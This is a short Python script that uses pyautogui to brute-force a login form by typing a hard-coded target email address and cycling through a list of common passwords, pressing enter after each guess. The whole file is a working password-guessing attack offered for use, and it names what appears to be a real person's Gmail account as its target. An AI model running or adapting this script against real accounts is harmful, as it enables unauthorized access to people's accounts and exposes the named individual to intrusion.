import pyautogui
import time


TARGET_EMAIL = "zeroualiabdessamed62@gmail.com"
PASSWORD_LIST = [
    "123456", 
    "password", 
    "12345678", 
    "qwerty", 
    "ymTUfp3g",
    "111111", 
    "admin",
    "correct_password" 
]

def run_bruteforce():
    time.sleep(5)

    for password in PASSWORD_LIST:
        print(f"attempt by password :{password}")

 
        pyautogui.press('tab') 
        pyautogui.hotkey('ctrl', 'a')
        pyautogui.press('backspace')
        pyautogui.write(TARGET_EMAIL)


        pyautogui.press('tab') 
        pyautogui.hotkey('ctrl', 'a')
        pyautogui.press('backspace')
        pyautogui.write(password)
        time.sleep(4)
     
        pyautogui.press('enter')
        pyautogui.press('tab') 
        

   

if __name__ == "__main__":
    run_bruteforce()